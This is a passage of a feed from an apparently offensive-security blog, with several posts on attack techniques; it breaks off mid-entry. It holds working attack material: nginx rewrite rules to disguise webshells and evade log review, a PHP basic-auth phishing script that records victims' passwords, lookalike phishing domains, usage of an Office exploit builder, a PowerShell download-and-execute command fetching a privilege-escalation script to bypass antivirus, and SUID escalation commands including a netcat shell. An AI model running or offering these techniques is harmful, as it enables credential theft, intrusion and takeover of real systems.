      <category term="cobaltstrike" scheme="https://evi1cg.github.io/tags/cobaltstrike/"/>
    
  </entry>
  
  <entry>
    <title>Hack with rewrite</title>
    <link href="https://evi1cg.github.io/archives/hack_with_rewrite.html"/>
    <id>https://evi1cg.github.io/archives/hack_with_rewrite.html</id>
    <published>2018-03-07T22:26:00.000Z</published>
    <updated>2019-01-15T05:43:36.768Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>大家都知道apache，nginx等有rewrite的功能，通过rewrite规则可以把输入的URL转换成另一个URL，这是我们常见的一种需求，可以让我们的url变得更加简洁。但是其实这个功能也可被用于一些别的目的。下面就简单的介绍一下。</p><h2 id="0x01-后门"><a href="#0x01-后门" class="headerlink" title="0x01 后门"></a>0x01 后门</h2><p>关于通过配置文件做后门已经有很多文章有了介绍，即<a href="http://man.chinaunix.net/newsoft/ApacheManual/howto/htaccess.html" target="_blank" rel="noopener">.htaccess</a>和<a href="http://php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="noopener">.user.ini</a>文件构造后门，关于.htaccess后门可以看<a href="http://www.hackdig.com/02/hack-18445.htm" target="_blank" rel="noopener">这里</a>,user.ini后门P牛也发过一篇文章，可以看<a href="http://www.vuln.cn/6001" target="_blank" rel="noopener">这里</a>,当然还有柠檬师傅的<a href="http://www.cnblogs.com/iamstudy/articles/php_ini_backdoor.html" target="_blank" rel="noopener">php.ini构成的后门</a>。那么跟rewrite有什么关系呢。其实rewrite主要是为了<strong><code>逃避日志审查</code></strong>，通过rewrite，我们可以通过访问一个图片后缀的文件来执行我们的webshell，但是修改这些配置文件<code>需要一定的权限</code>。下面来进行一下简单的介绍。测试的时候主要是使用nginx,所以对nginx进行一下介绍，关于apache的配置有兴趣可以自己去查一波。下面是我的配置：<br>ngingx.conf<br><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">worker_processes </span> 1;</span><br><span class="line"><span class="string">events </span>&#123;</span><br><span class="line">    <span class="string">worker_connections </span> <span class="string">1024;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="string">http </span>&#123;</span><br><span class="line">    <span class="string">include </span>      <span class="string">mime.</span><span class="string">types;</span></span><br><span class="line">    <span class="string">default_type </span> <span class="string">application/</span><span class="string">octet-stream;</span></span><br><span class="line">    <span class="string">sendfile </span>       <span class="string">on;</span></span><br><span class="line">    <span class="string">keepalive_timeout </span> <span class="string">65;</span></span><br><span class="line">    <span class="string">include </span>/<span class="string">usr/</span><span class="string">local/</span><span class="string">nginx/</span><span class="string">vhosts/</span>*.<span class="string">conf;</span></span><br><span class="line">    <span class="string">server </span>&#123;</span><br><span class="line">        <span class="string">listen </span>      <span class="string">80;</span></span><br><span class="line">        <span class="string">server_name </span> <span class="string">localhost;</span></span><br><span class="line">        <span class="string">location </span>/ &#123;</span><br><span class="line">            <span class="string">root </span>  <span class="string">html;</span></span><br><span class="line">            <span class="string">index </span> <span class="string">index.</span><span class="string">html </span><span class="string">index.</span><span class="string">htm;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="string">error_page </span>  <span class="string">500 </span><span class="string">502 </span><span class="string">503 </span><span class="string">504 </span> /<span class="string">50x.</span><span class="string">html;</span></span><br><span class="line">        <span class="string">location </span>= /<span class="string">50x.</span><span class="string">html </span>&#123;</span><br><span class="line">            <span class="string">root </span>  <span class="string">html;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>配置了多个域名的配置，所以针对某个域名的配置文件在vhosts里面，要配置的域名的配置文件：mydomain.conf<br><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">server </span>&#123;</span><br><span class="line">    <span class="string">listen </span><span class="string">80;</span></span><br><span class="line">    <span class="string">server_name </span> <span class="string">mydomain.</span><span class="string">com;</span></span><br><span class="line">    <span class="string">root </span>/<span class="string">www/</span><span class="string">mydomain;</span></span><br><span class="line">    <span class="string">index </span><span class="string">index.</span><span class="string">html </span><span class="string">index.</span><span class="string">php;</span></span><br><span class="line">    <span class="string">if </span>( $<span class="string">query_string </span>~* <span class="string">".*[\;'\&lt;\&gt;].*"</span> )&#123;</span><br><span class="line">        <span class="string">return </span><span class="string">404;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">location </span>~ .*\.(<span class="string">gif|</span><span class="string">jpg|</span><span class="string">jpeg|</span><span class="string">bmp|</span><span class="string">png|</span><span class="string">swf|</span><span class="string">flv|</span><span class="string">ico)</span>$ &#123;</span><br><span class="line">        <span class="string">expires </span><span class="string">30d;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="string">location </span>~ .*\.(<span class="string">js|</span><span class="string">css)</span>?$ &#123;</span><br><span class="line">        <span class="string">expires </span><span class="string">7d;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">location </span>~ \.<span class="string">php$</span> &#123;</span><br><span class="line">        <span class="string">fastcgi_pass </span>  <span class="string">127.</span>0.0.<span class="string">1:9000;</span></span><br><span class="line">        <span class="string">fastcgi_index </span> <span class="string">index.</span><span class="string">php;</span></span><br><span class="line"></span><br><span class="line">        <span class="string">include </span>       <span class="string">fastcgi_params;</span></span><br><span class="line">        <span class="comment">#设置PATH_INFO并改写SCRIPT_FILENAME,SCRIPT_NAME服务器环境变量</span></span><br><span class="line">        <span class="string">set </span>$<span class="string">fastcgi_script_name2 </span>$<span class="string">fastcgi_script_name;</span></span><br><span class="line">        <span class="string">if </span>($<span class="string">fastcgi_script_name </span>~ <span class="string">"^(.+\.php)(/.+)$"</span>) &#123;</span><br><span class="line">            <span class="string">set </span>$<span class="string">fastcgi_script_name2 </span>$1;</span><br><span class="line">            <span class="string">set </span>$<span class="string">path_info </span>$2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="string">fastcgi_param </span>  <span class="string">PATH_INFO </span>$<span class="string">path_info;</span></span><br><span class="line">        <span class="string">fastcgi_param </span>  <span class="string">SCRIPT_FILENAME </span>  $<span class="string">document_root$</span><span class="string">fastcgi_script_name2;</span></span><br><span class="line">        <span class="string">fastcgi_param </span>  <span class="string">SCRIPT_NAME </span>  $<span class="string">fastcgi_script_name2;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>要配置重定向很简单，只需要加入<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.png$</span> &#123;</span><br><span class="line"><span class="attribute">rewrite</span><span class="regexp"> ^/img/test\.png$</span> /img/test.php <span class="literal">last</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>意思是匹配以png结尾的url，如果匹配到 img/test.png，则重定向到 img/test.php，所以，只需要在img目录下存放test.php，我们就可以通过访问 <a href="http://domain.com/img/test.png来访问。如下图" target="_blank" rel="noopener">http://domain.com/img/test.png来访问。如下图</a>:<br><img src="https://evi1cg.github.io/usr/uploads/2018/03/2359099842.png" alt="1520482949500.png"></p><p>关于更多匹配的规则，可以看<a href="http://seanlook.com/2015/05/17/nginx-location-rewrite/" target="_blank" rel="noopener">这篇文章</a>。</p><blockquote><p>配置完需要重启nginx服务。</p></blockquote><h2 id="0x02-基础认证钓鱼"><a href="#0x02-基础认证钓鱼" class="headerlink" title="0x02 基础认证钓鱼"></a>0x02 基础认证钓鱼</h2><p>关于基础认证钓鱼，其实很早之前就已经有文章介绍过了，比如<a href="http://www.freebuf.com/articles/web/147207.html" target="_blank" rel="noopener">如何制作基础认证钓鱼页面</a>。其实原理就是在页面中插入一个php的img，即:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://site.com/1.php"</span><span class="attr">alt</span>=<span class="string">"Could not load image - Invalid credentils."</span>/&gt;</span>&gt;</span><br></pre></td></tr></table></figure></p><p>php的代码就是401的验证，当用户打开这个页面的时候，由于请求了<a href="http://site.com/1.php，所以会弹出验证的页面，用户输入账号密码之后，密码则会被攻击者记录。" target="_blank" rel="noopener">http://site.com/1.php，所以会弹出验证的页面，用户输入账号密码之后，密码则会被攻击者记录。</a></p><blockquote><p>注：这种方法适用于Firefox和IE浏览器，Chrome并不会弹出基础认证窗口。</p></blockquote><p>为了让此攻击达到更好地隐蔽效果，我们可以使用rewrite来重写url。则使得访问的链接文件后缀为一个图片。为了达到更好地攻击效果，写了以下php代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$now = <span class="keyword">new</span> DateTime();</span><br><span class="line">$user = <span class="keyword">isset</span>($_SERVER[<span class="string">'PHP_AUTH_USER'</span>]) ? $_SERVER[<span class="string">'PHP_AUTH_USER'</span>] : <span class="string">""</span>;</span><br><span class="line">$pass = <span class="keyword">isset</span>($_SERVER[<span class="string">'PHP_AUTH_PW'</span>])   ? $_SERVER[<span class="string">'PHP_AUTH_PW'</span>]   : <span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span> ($user &amp;&amp; $pass)&#123;</span><br><span class="line">    $fp = fopen(<span class="string">"count.txt"</span>, <span class="string">"a"</span>);</span><br><span class="line">    $content = fread($fp);</span><br><span class="line">    $ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">    $all = file_get_contents(<span class="string">"count.txt"</span>);</span><br><span class="line">    fwrite($fp, $now-&gt;format(<span class="string">"Y-m-d H:i:s"</span>) . <span class="string">"\t"</span> . $ip . <span class="string">"\t"</span> . $user . <span class="string">":"</span> . $pass . <span class="string">"\n"</span>);</span><br><span class="line">    $line = substr_count($all,$ip);</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($line &lt; <span class="number">2</span>)&#123;</span><br><span class="line">    header(<span class="string">'WWW-Authenticate: Basic realm="Corporate domain"'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">'content-type: image/png'</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">"test.png"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>代码的功能就是弹出认证窗口，等待用户输入，并将输入的账号密码存到count.txt，如果此用户输入已达3次（一次输入可能是随便输入的账号密码），则输出正常图片。演示如下：</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/03/4878.gif" alt="4878.gif"><br>当然，你可以自己定义其他功能，比如将账号密码发送到邮箱等等。</p><p>php代码写好了，怎么利用呢？<br>其实我们要做到就是找各种编辑器，找那种可以远程插入图片的，然后插入我们的链接，如果网站直接把链接插入网站，那么在加载的时候，就会加载我们的验证页面。rewrite除了可以让后缀看起来是一个图片文件，其实还可以对一些编辑器进行绕过，比如插入远程图片的时候，编辑器对图片进行预览:</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/03/826095912.png" alt="1520488071492.png"></p><p>碰到这种情况，我们可以首先使用默认配置的nginx插入图片，如下图：</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/03/4126320578.png" alt="1520488284941.png"></p><p>插入成功并提交以后，再重新修改rewrite。这样可以进行一些绕过。某种情景的攻击如下：<br>demo:<br><img src="https://evi1cg.github.io/usr/uploads/2018/03/387318502.gif" alt="demo.gif"></p><p>为了达到更好地效果。攻击者可以注册一个看起来受信任的域名。比如说，如果攻击者的目标是targetdomain.com，那么他就可以注册如下的类似地址：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">targetdomain.co</span><br><span class="line">targetdomain.net</span><br><span class="line">target-domain.com</span><br><span class="line">targetdomain-oauth.com</span><br><span class="line">targetdomain-cdn.com</span><br><span class="line">targetdomain-images.com</span><br><span class="line">login-targetdomain.com</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h2&gt;&lt;p&gt;大家都知道apache，nginx等有rewrite的功能，通过rewrite规则可以把输入的URL
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2018-0802利用</title>
    <link href="https://evi1cg.github.io/archives/CVE_2018_0802.html"/>
    <id>https://evi1cg.github.io/archives/CVE_2018_0802.html</id>
    <published>2018-01-12T03:41:00.000Z</published>
    <updated>2019-01-16T05:12:48.647Z</updated>
    
    <content type="html"><![CDATA[<p>在CVE-2017-11882之后，2018年1月份又出了一个新的“噩梦公式二代”，在野样本嵌入了利用Nday漏洞和0day漏洞的2个公式对象同时进行攻击，Nday漏洞可以攻击未打补丁的系统，0day漏洞则攻击全补丁系统，绕过了CVE-2017-11882补丁的ASLR（地址随机化）安全保护措施，攻击最终将在用户电脑中植入恶意的远程控制程序。关于此漏洞的分析，可以看<a href="http://www.freebuf.com/vuls/159789.html" target="_blank" rel="noopener">这里</a>，今天看到在github公开了一个CVE-2018-0802的利用脚本，地址<a href="https://github.com/zldww2011/CVE-2018-0802_POC" target="_blank" rel="noopener">在这</a>，为了达到最完美的利用，所以编写了RTF_11882_0802。 </p><p>GIT：<a href="https://github.com/ridter/RTF_11882_0802" target="_blank" rel="noopener">RTF_11882_0802</a></p><p>此脚本集合了两个公式利用漏洞。</p><p>利用方式与之前的方式一样。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python RTF_11882_0802.py -c <span class="string">"cmd.exe /c calc.exe"</span>  -i test.rtf -o test.doc</span><br></pre></td></tr></table></figure></p><p>其实就是简单粗暴的把两个公式编辑器插入文档中，一个是11882，一个是0802。</p><p>“噩梦公式二代”（CVE-2018-0802）所使用的0day漏洞堪称CVE-2017-11882的双胞胎漏洞，攻击样本中的一个漏洞针对未打补丁前的系统，另外一个漏洞针对打补丁后的系统，利用两个OLE同时进行攻击，黑客精心构造的攻击完美兼容了系统漏洞补丁环境的不同情况。这个漏洞的利用技巧和Bypass ASLR的方式都带有一定的巧合性，假如EQNEDT32.EXE模块内没有一条满足条件的ret指令可以用来绕过ASLR，假如lpLogFont不是sub_21774的第一个参数，假如CVE-2017-11882的补丁修复方式强制开启了DEP保护，“噩梦公式二代”将没有可乘之机。</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>一、及时更新补丁</p><p>补丁下载地址：</p><p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0802" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0802</a></p><p>二、通过注册表禁用此模块，可通过修改注册表，禁用以下COM控件的方式进行缓解，其中XX.X为版本号</p><p>在运行中输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add “HKLM\SOFTWARE\Microsoft\Office\XX.X\Common\COMCompatibility\&#123;0002CE02-0000- 0000-C000-000000000046&#125;” /v”Compatibility Flags” /t REG_DWORD /d 0×400</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add”HKLM\SOFTWARE\Wow6432Node\Microsoft\Office\XX.X\Common\COMCompatibility\&#123;0002CE02-0000-0000-C000-000000000046&#125;” /v”Compatibility Flags” /t REG_DWORD /d 0×400</span><br></pre></td></tr></table></figure><p><strong><code>注：此脚本只是为了安全研究，切勿非法使用！使用此脚本所造成的一切法律问题及后果，本站概不负责！</code></strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在CVE-2017-11882之后，2018年1月份又出了一个新的“噩梦公式二代”，在野样本嵌入了利用Nday漏洞和0day漏洞的2个公式对象同时进行攻击，Nday漏洞可以攻击未打补丁的系统，0day漏洞则攻击全补丁系统，绕过了CVE-2017-11882补丁的ASLR（地
      
    
    </summary>
    
      <category term="奇技淫巧" scheme="https://evi1cg.github.io/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
    
      <category term="office" scheme="https://evi1cg.github.io/tags/office/"/>
    
  </entry>
  
  <entry>
    <title>BypassAV With ReflectivePEInjection</title>
    <link href="https://evi1cg.github.io/archives/BypassAV_With_ReflectivePEInjection.html"/>
    <id>https://evi1cg.github.io/archives/BypassAV_With_ReflectivePEInjection.html</id>
    <published>2017-12-27T03:34:00.000Z</published>
    <updated>2019-01-16T05:14:25.237Z</updated>
    
    <content type="html"><![CDATA[<p>有时候，使用某些exp进行提权的时候，exp可能会被查杀，当然，有源码的话，我们可以在源码上进行修改进行免杀处理，但是今天介绍的是另外一只方法，即使用PEloader来加载exp。<br>powershell的PEloader在<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="noopener">这里</a>，查看代码我们可以看到，这个脚本使用非常简单，具体代码如下：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$PEBytes</span> = [IO.File]::ReadAllBytes(<span class="string">'DemoEXE.exe'</span>)</span><br><span class="line">Invoke-ReflectivePEInjection -PEBytes <span class="variable">$PEBytes</span> -ExeArgs <span class="string">"Arg1 Arg2 Arg3 Arg4"</span></span><br></pre></td></tr></table></figure></p><p>获取exp的字节流，之后再在内存中加载exp，所以思路也很简单，我们只需要把需要的exp转换成字符串，写入脚本，就可以构造一个powershell脚本。</p><p>这里整理了一个脚本方便转换：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Convert-BinaryToString &#123;</span><br><span class="line">   [CmdletBinding()] <span class="keyword">param</span> (</span><br><span class="line">      [string] <span class="variable">$FilePath</span></span><br><span class="line">   )</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="variable">$ByteArray</span> = [System.IO.File]::ReadAllBytes(<span class="variable">$FilePath</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="string">"Failed to read file. Ensure that you have permission to the file, and that the file path is correct."</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$ByteArray</span>) &#123;</span><br><span class="line">      <span class="variable">$Base64String</span> = [System.Convert]::ToBase64String(<span class="variable">$ByteArray</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="string">'$ByteArray is $null.'</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$Base64String</span> | <span class="built_in">set-content</span> (<span class="string">"b64.txt"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>使用zcgonvh的16032做演示。使用脚本转换：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\evi1cg\Desktop\<span class="number">16</span>_032&gt; . .\Convert-BinaryToString.ps1</span><br><span class="line">PS C:\Users\evi1cg\Desktop\<span class="number">16</span>_032&gt; Convert-BinaryToString -FilePath .\ms16-<span class="number">032</span>_x64.exe</span><br></pre></td></tr></table></figure></p><p>生成base64的字符串并存储在b64.txt中。<br><img src="https://evi1cg.github.io/usr/uploads/2017/12/3522762171.png" alt="4B544212-75E6-4CAD-839C-18F77CA759EA.png"></p><p>使用如下命令进行转换：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$InputString</span> = <span class="string">"base64string"</span></span><br><span class="line"><span class="variable">$PEBytes</span> = [System.Convert]::FromBase64String(<span class="variable">$InputString</span>)</span><br></pre></td></tr></table></figure></p><p>之后就可以使用<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-ReflectivePEInjection -PEBytes <span class="variable">$PEBytes</span></span><br></pre></td></tr></table></figure></p><p>进行加载，最后分享一下最终的脚本：</p><p><a href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/E2P_MS16-032.ps1" target="_blank" rel="noopener">E2P_MS16-032.ps1</a></p><p>使用方式为：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E2P_MS16-<span class="number">032</span> -Command <span class="string">'"net user"'</span></span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io/usr/uploads/2017/12/3827318615.jpg" alt="photo_2017-12-27_20-07-13.jpg"></p><p>脚本GIT：<a href="https://github.com/ridter/pentest" target="_blank" rel="noopener">Pentest</a>。</p><p>远程加载命令：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/E2P_MS16-032.ps1');E2P_MS16-032 -Command '\"</span>whoami\<span class="string">"'"</span></span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io/usr/uploads/2017/12/873755257.png" alt="717403C9-86AA-4594-A35F-9D0A1307088C.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;有时候，使用某些exp进行提权的时候，exp可能会被查杀，当然，有源码的话，我们可以在源码上进行修改进行免杀处理，但是今天介绍的是另外一只方法，即使用PEloader来加载exp。&lt;br&gt;powershell的PEloader在&lt;a href=&quot;https://github
      
    
    </summary>
    
      <category term="奇技淫巧" scheme="https://evi1cg.github.io/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
    
      <category term="Powershell" scheme="https://evi1cg.github.io/tags/Powershell/"/>
    
      <category term="bypassav" scheme="https://evi1cg.github.io/tags/bypassav/"/>
    
  </entry>
  
  <entry>
    <title>SUID Privilege Escalation</title>
    <link href="https://evi1cg.github.io/archives/SUID_Privilege_Escalation.html"/>
    <id>https://evi1cg.github.io/archives/SUID_Privilege_Escalation.html</id>
    <published>2017-12-19T19:49:00.000Z</published>
    <updated>2019-01-14T14:44:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>Linux提权中，可以用的SUID文件来提权，SUID的作用就是：让本来没有相应权限的用户运行这个程序时，可以访问没有权限访问的资源。通常可以使用一下命令来找有SUID标志位的文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure></p><p>例如nmap<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /usr/bin/nmap</span><br><span class="line">-rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap</span><br></pre></td></tr></table></figure></p><p>存在<strong>s</strong> 则表示其存在SUID标志位，并拥有root的执行权限。以下是几类可用于提权的文件总结：</p><h2 id="1-Nmap"><a href="#1-Nmap" class="headerlink" title="1.Nmap"></a>1.Nmap</h2><p>老版本的nmap（2.02-5.21）有 interactive，是允许用户执行系统命令的。提权方式<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure></p><p>之后执行命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure></p><p>msf中的模块为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/<span class="built_in">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure></p><h2 id="2-Find"><a href="#2-Find" class="headerlink" title="2.Find"></a>2.Find</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch <span class="built_in">test</span></span><br><span class="line">find <span class="built_in">test</span> -<span class="built_in">exec</span> whoami \;</span><br></pre></td></tr></table></figure><p>如果服务器上装了nc，可以直接使用以下命令进行监听：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find <span class="built_in">test</span> -<span class="built_in">exec</span> netcat -lvp 5555 -e /bin/sh \;</span><br></pre></td></tr></table></figure></p><p>之后进行连接：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcat 192.168.1.100 5555</span><br></pre></td></tr></table></figure></p><p>则可获取root shell</p><h2 id="3-vim-vi"><a href="#3-vim-vi" class="headerlink" title="3.vim/vi"></a>3.vim/vi</h2><p>打开vim,按下ESC<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure></p><p>则可执行命令</p><h2 id="4-bash"><a href="#4-bash" class="headerlink" title="4.bash"></a>4.bash</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2<span class="comment"># id</span></span><br><span class="line">uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)</span><br></pre></td></tr></table></figure><h2 id="5-less"><a href="#5-less" class="headerlink" title="5.less"></a>5.less</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><h2 id="6-more"><a href="#6-more" class="headerlink" title="6.more"></a>6.more</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">more /home/pelle/myfile</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><h2 id="7-cp"><a href="#7-cp" class="headerlink" title="7.cp"></a>7.cp</h2><p>使用cp覆盖 /etc/shadow</p><h2 id="8-mv"><a href="#8-mv" class="headerlink" title="8.mv"></a>8.mv</h2><p>使用mv 覆盖 /etc/shadow 或者/etc/sudoers</p><h2 id="9-awk"><a href="#9-awk" 